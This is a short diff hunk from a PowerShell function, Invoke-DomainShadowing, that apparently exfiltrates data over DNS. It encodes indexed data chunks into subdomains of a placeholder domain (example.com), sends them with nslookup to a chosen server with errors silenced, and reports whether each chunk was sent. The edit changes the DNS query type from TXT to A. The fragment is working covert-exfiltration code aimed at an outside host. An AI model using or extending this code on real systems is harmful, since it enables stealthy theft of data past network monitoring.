@@ -42,7 +42,7 @@ function Invoke-DomainShadowing {
         $query = "$($chunk.Index).$($chunk.Data).example.com"  # Modify as needed to create a valid DNS name format
         try {
             # Using nslookup to send DNS query and redirecting error stream to null
-            $nslookupResult = nslookup -type=txt $query $ServerAddress 2>$null
+            $nslookupResult = nslookup -type=A $query $ServerAddress 2>$null
             if ($nslookupResult -match "Non-existent domain|NXDOMAIN") {
                 $status = "Failed To Send"
                 $foregroundColor = "Red"
